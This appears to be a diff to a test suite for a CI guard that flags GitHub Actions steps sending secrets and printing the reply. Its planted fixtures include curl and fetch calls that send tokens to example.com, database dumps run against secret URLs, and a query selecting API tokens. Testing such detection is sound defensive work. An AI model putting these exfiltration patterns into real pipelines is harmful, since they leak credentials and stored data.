+    id: 'H43',
+    what: 'k6 run, inside a script called with the auth env (as load-tests/k6/run-all.sh does)',
+    script: 'bash load-tests/run-all.sh',
+    env: { SUPABASE_ACCESS_TOKEN: '${{ secrets.SUPABASE_ACCESS_TOKEN }}' },
+    files: {
+      'load-tests/run-all.sh':
+        '#!/usr/bin/env bash\nfor script in load-tests/scenarios/*.js; do\n  k6 run --summary-export "out.json" "$script"\ndone\n',
+    },
+    finds: {
+      unresolved: /^load-tests\/run-all\.sh:3: k6 run .*\(k6 runs code the census cannot read\)/,
+    },
+  },
+  {
+    id: 'H44',
+    what: 'npx artillery run, locust and hurl',
+    script:
+      'npx artillery run load/basic.yml\nlocust -f load/locustfile.py\nhurl --test load/api.hurl',
+    env: { TEST_PASSWORD: '${{ secrets.TEST_PASSWORD }}' },
+    finds: { unresolved: /hurl --test load\/api\.hurl \(hurl runs code the census cannot read\)/ },
+  },
+  {
+    id: 'H45',
+    what: 'go test, cargo run, dotnet test, swift test and xcodebuild ... test',
+    script:
+      'go test ./...\ncargo run --bin report\ndotnet test\nswift test\nxcodebuild -scheme App test',
+    env: { TEST_PASSWORD: '${{ secrets.TEST_PASSWORD }}' },
+    finds: {
+      unresolved: /xcodebuild -scheme App test \(xcodebuild runs code the census cannot read\)/,
+    },
+  },
+  {
+    id: 'H46',
+    what: 'rspec, phpunit, tox and nox',
+    script: 'rspec spec/report_spec.rb\nphpunit tests\ntox -e py312\nnox -s tests',
+    env: { TEST_PASSWORD: '${{ secrets.TEST_PASSWORD }}' },
+    finds: { unresolved: /nox -s tests \(nox runs code the census cannot read\)/ },
+  },
+  {
+    id: 'H47',
+    what: 'control: go build and cargo build run no program of ours',
+    script: 'go build ./...\ncargo build --release',
+    env: { TEST_PASSWORD: '${{ secrets.TEST_PASSWORD }}' },
+    finds: { nothing: true },
+  },
+  // A repository file a bare name may run: PATH changed for later steps or
+  // here, or a repository file put into a bin directory.
+  {
+    id: 'H48',
+    what: 'a repository directory added to $GITHUB_PATH, then a bare name from it',
+    workflow: hookJob('echo "$GITHUB_WORKSPACE/scripts" >> "$GITHUB_PATH"', 'notify'),
+    files: { 'scripts/notify': NOTIFY_SCRIPT },
+    finds: {
+      unresolved: />> "\$GITHUB_PATH" \(it adds a directory to PATH for the steps after it/,
+    },
+  },
+  {
+    id: 'H49',
+    what: 'export PATH with a repository directory, then a bare name from it',
+    script: 'export PATH="$PWD/scripts:$PATH"\nnotify',
+    env: HOOK_ENV,
+    files: { 'scripts/notify': NOTIFY_SCRIPT },
+    finds: { unresolved: /export PATH="\$PWD\/scripts:\$PATH" \(it sets PATH/ },
+  },
+  {
+    id: 'H50',
+    what: 'a repository script installed into /usr/local/bin, then run by its bare name',
+    script: 'sudo install -m 0755 scripts/notify.sh /usr/local/bin/notify\nnotify',
+    env: HOOK_ENV,
+    files: { 'scripts/notify.sh': NOTIFY_SCRIPT },
+    finds: {
+      unresolved:
+        /install -m 0755 scripts\/notify\.sh \/usr\/local\/bin\/notify \(it puts a file into/,
+    },
+  },
+  {
+    id: 'H51',
+    what: "PATH set in a step's env: and written to $GITHUB_ENV",
+    workflow: [
+      'on: push',
+      'jobs:',
+      '  plant:',
+      '    runs-on: ubuntu-latest',
+      '    steps:',
+      '      - run: echo "PATH=$GITHUB_WORKSPACE/scripts:$PATH" >> "$GITHUB_ENV"',
+      '      - env:',
+      '          PATH: ./scripts:/usr/bin:/bin',
+      '        run: notify',
+    ].join('\n'),
+    finds: {
+      unresolved: /plant\.yml:8: PATH: \.\/scripts:\/usr\/bin:\/bin \(an env: that sets PATH/,
+    },
+  },
+  {
+    id: 'H52',
+    what: 'control: a downloaded program installed into /usr/local/bin is not a repository file',
+    script: 'sudo install -m 0755 trufflehog /usr/local/bin/trufflehog',
+    env: HOOK_ENV,
+    finds: { nothing: true },
+  },
+  // Two fail-closed fallbacks: a secret the census cannot name, as a value
+  // over several lines.
+  {
+    id: 'H53',
+    what: 'an action passed a secret as a with: value on the next line (no name the census knows)',
+    workflow: [
+      'on: push',
+      'jobs:',
+      '  plant:',
+      '    runs-on: ubuntu-latest',
+      '    steps:',
+      '      - uses: example/notify-action@v1',
+      '        with:',
+      '          token:',
+      '            ${{ secrets.HOOK_TOKEN }}',
+    ].join('\n'),
+    finds: {
+      unresolved: /plant\.yml:6: uses: example\/notify-action@v1 \(an action passed a secret/,
+    },
+  },
+  {
+    id: 'H54',
+    what: 'a job env: whose secret is on the next line, then an action',
+    workflow: [
+      'on: push',
+      'jobs:',
+      '  plant:',
+      '    runs-on: ubuntu-latest',
+      '    env:',
+      '      HOOK_TOKEN:',
+      '        ${{ secrets.HOOK_TOKEN }}',
+      '    steps:',
+      '      - uses: example/notify-action@v1',
+    ].join('\n'),
+    finds: {
+      unresolved: /plant\.yml:9: uses: example\/notify-action@v1 \(an action passed a secret/,
+    },
+  },
+  // Dump, export and test clients print what the server holds.
+  {
+    id: 'H55',
+    what: 'pg_dump, pg_dumpall, pg_prove, pgcli, mycli, mysqldump, mongodump and mongoexport',
+    script: [
+      'pg_dump "$DATABASE_URL"',
+      'pg_dumpall -d "$DATABASE_URL"',
+      'pg_prove -d "$DATABASE_URL" supabase/tests/report.test.sql',
+      'pgcli "$DATABASE_URL"',
+      'mycli -h db.example.test',
+      'mysqldump --all-databases -h db.example.test -p"$DB_PASSWORD"',
+      'mongodump --uri "$DATABASE_URL"',
+      'mongoexport --uri "$DATABASE_URL" --collection orders',
+    ].join('\n'),
+    env: { DATABASE_URL: '${{ secrets.DATABASE_URL }}', DB_PASSWORD: '${{ secrets.DB_PASSWORD }}' },
+    finds: {
+      unresolved: /mongoexport --uri "\$DATABASE_URL" --collection orders \(a client that prints/,
+    },
+  },
 ];
 
 /** A workflow, and the repository files it reads, at one moment. */
@@ -3966,7 +5418,13 @@ function readAsItIs(result: Census): Record<string, ReadByHand> {
   return Object.fromEntries(
     result.unresolved.map((entry) => [
       `${entry.file}: ${entry.command}`,
-      { reason: 'read', secrets: entry.secrets, jobSecrets: entry.jobSecrets, runs: entry.runs },
+      {
+        reason: 'read',
+        secrets: entry.secrets,
+        jobSecrets: entry.jobSecrets,
+        runs: entry.runs,
+        calls: entry.calls,
+      },
     ]),
   );
 }
@@ -3998,6 +5456,43 @@ function reportJob(reportStep: string[], before: string[] = []): string {
 
 const REPORT_RUN = '        run: node scripts/report.mjs';
 const REPORT_FILES = { 'scripts/report.mjs': "console.log('report');\n" };
+
+/** A job whose first step maps AUDIT_TOKEN through env:, and whose Report step is `reportStep`. */
+function auditJob(reportStep: string[]): string {
+  return reportJob(reportStep, [
+    '      - env:',
+    '          AUDIT_TOKEN: ${{ secrets.AUDIT_TOKEN }}',
+    '        run: ./upload.sh',
+  ]);
+}
+const AUDIT_FILES = { ...REPORT_FILES, 'upload.sh': '#!/usr/bin/env bash\necho upload\n' };
+
+/** A program that sends REPORT_TOKEN and prints the answer. */
+const REPORT_PROGRAM = [
+  "const answer = await fetch('https://example.com/api/report', {",
+  "  headers: { 'X-Report-Key': process.env.REPORT_TOKEN },",
+  '});',
+  'console.log(await answer.text());',
+  '',
+].join('\n');
+/** The same in Python. */
+const REPORT_PYTHON = [
+  'import os, urllib.request',
+  'request = urllib.request.Request(',
+  '    "https://example.com/api/report", headers={"X-Report-Key": os.environ["REPORT_TOKEN"]}',
+  ')',
+  'print(urllib.request.urlopen(request).read())',
+  '',
+].join('\n');
+/** A job whose Report step maps REPORT_TOKEN and runs `script`. */
+function tokenJob(script: string): string {
+  return reportJob([
+    '        env:',
+    '          REPORT_TOKEN: ${{ secrets.REPORT_TOKEN }}',
+    '        run: |',
+    ...script.split('\n').map((line) => `          ${line}`),
+  ]);
+}
 
 interface Reread {
   id: string;
@@ -4258,6 +5753,302 @@ const REREADS: Reread[] = [
     },
     opens: /: psql -c "select 1" \(a client .*psql changed since it was read/,
   },
+  // The review of 1875b129c: a secret its job already uses, put into the
+  // call's environment by the shell; the files a call runs that its own words
+  // do not name (what a caller passes to "$@", a runner's own file, a
+  // module, the test files node --test finds past --import, a local action's
+  // code); and the files an option names inline. The guard of 1875b129c
+  // opened none of them.
+  {
+    id: 'F16',
+    what: 'a secret its job already uses, assigned in front of the call',
+    before: { workflow: auditJob([REPORT_RUN]), files: AUDIT_FILES },
+    after: {
+      workflow: auditJob([
+        '        run: AUDIT_TOKEN="${{ secrets.AUDIT_TOKEN }}" node scripts/report.mjs',
+      ]),
+      files: AUDIT_FILES,
+    },
+    opens:
+      /: node scripts\/report\.mjs .*its environment holds \[[^\]]*AUDIT_TOKEN[^\]]*\], read with \[\]/,
+  },
+  {
+    id: 'F17',
+    what: 'a secret its job already uses, given to the call through env NAME=...',
+    before: { workflow: auditJob([REPORT_RUN]), files: AUDIT_FILES },
+    after: {
+      workflow: auditJob([
+        '        run: env AUDIT_TOKEN="${{ secrets.AUDIT_TOKEN }}" node scripts/report.mjs',
+      ]),
+      files: AUDIT_FILES,
+    },
+    opens:
+      /: node scripts\/report\.mjs .*its environment holds \[[^\]]*AUDIT_TOKEN[^\]]*\], read with \[\]/,
+  },
+  {
+    id: 'F18',
+    what: 'a secret its job already uses, exported on the line before the call',
+    before: { workflow: auditJob([REPORT_RUN]), files: AUDIT_FILES },
+    after: {
+      workflow: auditJob([
+        '        run: |',
+        '          export AUDIT_TOKEN="${{ secrets.AUDIT_TOKEN }}"',
+        '          node scripts/report.mjs',
+      ]),
+      files: AUDIT_FILES,
+    },
+    opens:
+      /: node scripts\/report\.mjs .*its environment holds \[[^\]]*AUDIT_TOKEN[^\]]*\], read with \[\]/,
+  },
+  {
+    id: 'F19',
+    what: 'a secret its job already uses, written to a file in the run block of the call',
+    before: { workflow: auditJob([REPORT_RUN]), files: AUDIT_FILES },
+    after: {
+      workflow: auditJob([
+        '        run: |',
+        '          echo "${{ secrets.AUDIT_TOKEN }}" > audit-token.txt',
+        '          node scripts/report.mjs',
+      ]),
+      files: AUDIT_FILES,
+    },
+    opens: /its environment holds \[\$\{\{ secrets\.AUDIT_TOKEN \}\}\], read with \[\]/,
+  },
+  {
+    id: 'F20',
+    what: 'a secret its step holds, copied to another name in front of the call',
+    before: { workflow: tokenJob('node scripts/report.mjs'), files: REPORT_FILES },
+    after: {
+      workflow: tokenJob('AUDIT_KEY="$REPORT_TOKEN" node scripts/report.mjs'),
+      files: REPORT_FILES,
+    },
+    opens: /its environment holds \[AUDIT_KEY, REPORT_TOKEN\], read with \[REPORT_TOKEN\]/,
+  },
+  {
+    id: 'F21',
+    what: 'what a caller passes to a script that runs "$@" changes',
+    before: {
+      workflow: tokenJob('bash scripts/run.sh node scripts/status.mjs'),
+      files: {
+        'scripts/run.sh': '#!/usr/bin/env bash\n"$@"\n',
+        'scripts/status.mjs': "console.log('status');\n",
+        'scripts/report.mjs': REPORT_PROGRAM,
+      },
+    },
+    after: {
+      workflow: tokenJob('bash scripts/run.sh node scripts/report.mjs'),
+      files: {
+        'scripts/run.sh': '#!/usr/bin/env bash\n"$@"\n',
+        'scripts/status.mjs': "console.log('status');\n",
+        'scripts/report.mjs': REPORT_PROGRAM,
+      },
+    },
+    opens:
+      /^scripts\/run\.sh:2: "\$@" .*it runs scripts\/report\.mjs .*it is called as \[bash scripts\/run\.sh node scripts\/report\.mjs\]/,
+  },
+  {
+    id: 'F22',
+    what: 'what a caller passes to a function that runs "$@" changes',
+    before: {
+      workflow: tokenJob('run() { "$@"; }\nrun node scripts/status.mjs'),
+      files: {
+        'scripts/status.mjs': "console.log('status');\n",
+        'scripts/report.mjs': REPORT_PROGRAM,
+      },
+    },
+    after: {
+      workflow: tokenJob('run() { "$@"; }\nrun node scripts/report.mjs'),
+      files: {
+        'scripts/status.mjs': "console.log('status');\n",
+        'scripts/report.mjs': REPORT_PROGRAM,
+      },
+    },
+    opens: /: "\$@" .*it is called as \[run node scripts\/report\.mjs\]/,
+  },
+  {
+    id: 'F23',
+    what: "a Makefile's recipe that make deploy runs changes",
+    before: {
+      workflow: tokenJob('make deploy'),
+      files: { Makefile: 'deploy:\n\techo deploy\n' },
+    },
+    after: {
+      workflow: tokenJob('make deploy'),
+      files: {
+        Makefile:
+          'deploy:\n\tcurl -fsS -H "X-Report-Key: $$REPORT_TOKEN" https://example.com/api/report\n',
+      },
+    },
+    opens: /: make deploy \(make runs code .*Makefile changed since it was read/,
+  },
+  {
+    id: 'F24',
+    what: 'the package.json script that run-s deploy runs changes',
+    before: {
+      workflow: tokenJob('run-s deploy'),
+      files: { 'package.json': JSON.stringify({ scripts: { deploy: 'echo deploy' } }) },
+    },
+    after: {
+      workflow: tokenJob('run-s deploy'),
+      files: {
+        'package.json': JSON.stringify({
+          scripts: {
+            deploy: 'curl -fsS -H "X-Report-Key: $REPORT_TOKEN" https://example.com/api/report',
+          },
+        }),
+      },
+    },
+    opens: /: run-s deploy \(run-s runs code .*package\.json changed since it was read/,
+  },
+  {
+    id: 'F25',
+    what: 'the module python -m runs changes',
+    before: {
+      workflow: tokenJob('python3 -m tools.report'),
+      files: { 'tools/report.py': 'print("report")\n' },
+    },
+    after: {
+      workflow: tokenJob('python3 -m tools.report'),
+      files: { 'tools/report.py': REPORT_PYTHON },
+    },
+    opens: /: python3 -m tools\.report .*tools\/report\.py changed since it was read/,
+  },
+  {
+    id: 'F26',
+    what: 'node --import ./setup.mjs --test finds a new test file',
+    before: {
+      workflow: tokenJob('node --import ./setup.mjs --test'),
+      files: {
+        'setup.mjs': '',
+        'test/report.test.mjs': "import { test } from 'node:test';\n",
+      },
+    },
+    after: {
+      workflow: tokenJob('node --import ./setup.mjs --test'),
+      files: {
+        'setup.mjs': '',
+        'test/report.test.mjs': "import { test } from 'node:test';\n",
+        'test/route.test.mjs': `import { test } from 'node:test';\n${REPORT_PROGRAM}`,
+      },
+    },
+    opens: /it runs test\/route\.test\.mjs \([0-9a-f]+\), which was not read/,
+  },
+  {
+    id: 'F27',
+    what: "a local JavaScript action's code changes",
+    before: {
+      workflow: actionWorkflow('./.github/actions/report'),
+      files: {
+        '.github/actions/report/action.yml': JS_ACTION,
+        '.github/actions/report/index.js': "console.log('status only');\n",
+      },
+    },
+    after: {
+      workflow: actionWorkflow('./.github/actions/report'),
+      files: {
+        '.github/actions/report/action.yml': JS_ACTION,
+        '.github/actions/report/index.js': REPORT_PROGRAM.replaceAll('REPORT_TOKEN', 'INPUT_TOKEN'),
+      },
+    },
+    opens:
+      /uses: \.\/\.github\/actions\/report .*\.github\/actions\/report\/index\.js changed since it was read/,
+  },
+  {
+    id: 'F28',
+    what: "a local Docker action's entrypoint changes",
+    before: {
+      workflow: actionWorkflow('./.github/actions/report'),
+      files: {
+        ...DOCKER_ACTION,
+        '.github/actions/report/entrypoint.sh': '#!/bin/sh\necho report\n',
+      },
+    },
+    after: {
+      workflow: actionWorkflow('./.github/actions/report'),
+      files: {
+        ...DOCKER_ACTION,
+        '.github/actions/report/entrypoint.sh':
+          '#!/bin/sh\ncurl -fsS -H "Authorization: Bearer $INPUT_TOKEN" https://example.com/api/report\n',
+      },
+    },
+    opens:
+      /uses: \.\/\.github\/actions\/report .*\.github\/actions\/report\/entrypoint\.sh changed since it was read/,
+  },
+  {
+    id: 'F29',
+    what: 'the file psql --file= names changes',
+    before: {
+      workflow: tokenJob('psql --file=db/report.sql'),
+      files: { 'db/report.sql': 'select count(*) from orders;\n' },
+    },
+    after: {
+      workflow: tokenJob('psql --file=db/report.sql'),
+      files: { 'db/report.sql': 'select token from api_keys;\n' },
+    },
+    opens: /: psql --file=db\/report\.sql .*db\/report\.sql changed since it was read/,
+  },
+  {
+    id: 'F30',
+    what: 'the file node --import= loads changes',
+    before: {
+      workflow: tokenJob('node --import=./scripts/setup.mjs scripts/status.mjs'),
+      files: { 'scripts/setup.mjs': '', 'scripts/status.mjs': "console.log('status');\n" },
+    },
+    after: {
+      workflow: tokenJob('node --import=./scripts/setup.mjs scripts/status.mjs'),
+      files: {
+        'scripts/setup.mjs': REPORT_PROGRAM,
+        'scripts/status.mjs': "console.log('status');\n",
+      },
+    },
+    opens: /scripts\/setup\.mjs changed since it was read/,
+  },
+  {
+    id: 'F31',
+    what: 'a repository file make beside a bare make, with the workspace on PATH, changes',
+    before: {
+      workflow: hookJob(WORKSPACE_ON_PATH, 'make deploy'),
+      files: { make: '#!/usr/bin/env bash\necho "make is not installed here"\n' },
+    },
+    after: {
+      workflow: hookJob(WORKSPACE_ON_PATH, 'make deploy'),
+      files: { make: '#!/usr/bin/env bash\necho "make is not installed on this runner"\n' },
+    },
+    opens: /: make deploy \(make runs code .*make changed since it was read/,
+  },
+  {
+    id: 'F32',
+    what: 'the package.json a pnpm wrapper may run changes (./bin/pnpm, exec pnpm "$@")',
+    before: {
+      workflow: hookJob('./bin/pnpm run deploy'),
+      files: {
+        'bin/pnpm': shellWrapper('pnpm'),
+        'package.json': JSON.stringify({ scripts: { deploy: 'echo deploy' } }),
+      },
+    },
+    after: {
+      workflow: hookJob('./bin/pnpm run deploy'),
+      files: {
+        'bin/pnpm': shellWrapper('pnpm'),
+        'package.json': JSON.stringify({ scripts: { deploy: 'echo deployed' } }),
+      },
+    },
+    opens: /^bin\/pnpm:2: pnpm "\$@" .*package\.json changed since it was read/,
+  },
+  {
+    id: 'F33',
+    what: 'a package.json script a turbo wrapper may run changes (scripts/turbo.sh, turbo "$@")',
+    before: {
+      workflow: hookJob('scripts/turbo.sh run notify'),
+      files: { ...plantWorkspace('echo notify'), 'scripts/turbo.sh': shellWrapper('turbo') },
+    },
+    after: {
+      workflow: hookJob('scripts/turbo.sh run notify'),
+      files: { ...plantWorkspace('echo notified'), 'scripts/turbo.sh': shellWrapper('turbo') },
+    },
+    opens:
+      /^scripts\/turbo\.sh:2: turbo "\$@" .*apps\/web\/package\.json changed since it was read/,
+  },
   {
     id: 'F8',
     what: 'control: nothing it relies on changed (a comment, a step with no secret)',
@@ -4449,6 +6240,11 @@ describe('workflows never print the answer of a call that sends a secret', () =>
   // controls D13, E4 and D20. The review of a6b05212c added (9): the guard
   // of a6b05212c missed each of those but E22 (the guard of e43f2c33a still
   // found E17 and E20; this branch lost them when it named those programs).
+  // The review of 1875b129c added (10): the guard of 1875b129c missed each of
+  // those but the controls H33, H47 and H52, and H53 and H54, which pin the
+  // two fallbacks it had (main's guard of 7c28c3a9c found H1 to H4 and H6 to
+  // H15, which go by a program's name: this branch lost them when it read a
+  // program run by its path as a file only).
   describe('one plant per gap the second review found', () => {
     it.each(PLANTS)('$id: $what', (p) => {
       const files = p.files ?? {};
@@ -4474,6 +6270,33 @@ describe('workflows never print the answer of a call that sends a secret', () =>
         });
       }
     });
+
+    it('a path into node_modules is a program a step installed, which goes by its name', () => {
+      // node_modules/.bin/turbo is a shim pnpm wrote for this machine, not a file of the repository.
+      const result = census(
+        [{ file: 'plant.yml', text: workflow('node_modules/.bin/turbo --version', HOOK_ENV) }],
+        repoIo,
+      );
+      const read = [
+        ...result.scripts,
+        ...result.unresolved.flatMap((entry) => [entry.file, ...Object.keys(entry.runs)]),
+      ];
+      expect(read.filter((file) => file.includes('node_modules'))).toEqual([]);
+    });
+
+    it("the repository's own load tests are unresolved when a step runs them with a secret", () => {
+      // load-tests/k6/run-all.sh asks for SUPABASE_ACCESS_TOKEN; no workflow runs it today.
+      const script =
+        'bash load-tests/k6/run-all.sh\nnpx artillery run load-tests/artillery/basic.yml';
+      const env = { SUPABASE_ACCESS_TOKEN: '${{ secrets.SUPABASE_ACCESS_TOKEN }}' };
+      const result = census([{ file: 'plant.yml', text: workflow(script, env) }], repoIo);
+      expect(openItems(result)).toEqual([
+        expect.stringMatching(
+          /^load-tests\/k6\/run-all\.sh:\d+: k6 run .*\(k6 runs code the census cannot read\)$/,
+        ),
+        'plant.yml:11: artillery run load-tests/artillery/basic.yml (artillery runs code the census cannot read)',
+      ]);
+    });
   });
 
   // Review finding 4 (2026-10-31, of e43f2c33a): a reason read by hand stayed
@@ -4481,7 +6304,8 @@ describe('workflows never print the answer of a call that sends a secret', () =>
   // program it read changed. Each plant reads `before` by hand, then changes
   // it; the guard of e43f2c33a opened none of them. The review of a6b05212c
   // added F11 to F15: that guard opened none of them but F14, which holds
-  // what it found for a program an earlier step made.
+  // what it found for a program an earlier step made. The review of
+  // 1875b129c added F16 to F33: that guard opened none of them.
   describe('a reason read by hand holds only while what it relies on holds', () => {
     it.each(REREADS)('$id: $what', (p) => {
       const read = readAsItIs(censusAt(p.before));
@@ -4506,6 +6330,29 @@ describe('workflows never print the answer of a call that sends a secret', () =>
         expect(hand && changedSince(hand, entry).join('; '), key(entry)).toMatch(
           /its environment holds \[[^\]]*S33_PLANTED[^\]]*\], read with/,
         );
+      }
+    });
+
+    it('the real smoke entry opens again when a secret its job uses is put in front of it', () => {
+      // smoke-sim.yml runs smoke.py with STOCKPILOT_SMOKE_PASSWORD; its job uses EXPO_TOKEN too.
+      // If the step changes, move this check to the entry that replaces it.
+      const smoke = 'python3 scripts/smoke/smoke.py --ci --udid "$SMOKE_UDID"';
+      expect(Object.keys(READ_BY_HAND)).toContain(`.github/workflows/smoke-sim.yml: ${smoke}`);
+      for (const run of [
+        `EXPO_TOKEN="\${{ secrets.EXPO_TOKEN }}" ${smoke}`,
+        `env EXPO_TOKEN="\${{ secrets.EXPO_TOKEN }}" ${smoke}`,
+        `export EXPO_TOKEN="\${{ secrets.EXPO_TOKEN }}"; ${smoke}`,
+      ]) {
+        const workflows = repoWorkflows().map(({ file, text }) => {
+          if (!file.endsWith('/smoke-sim.yml')) return { file, text };
+          expect(text).toContain(`run: ${smoke}\n`);
+          return { file, text: text.replace(`run: ${smoke}\n`, `run: ${run}\n`) };
+        });
+        expect(openItems(census(workflows, repoIo), READ_BY_HAND), run).toEqual([
+          expect.stringMatching(
+            /smoke\.py --ci --udid "\$SMOKE_UDID" .*its environment holds \[[^\]]*EXPO_TOKEN[^\]]*\], read with \[STOCKPILOT_SMOKE_PASSWORD\]/,
+          ),
+        ]);
       }
     });
 
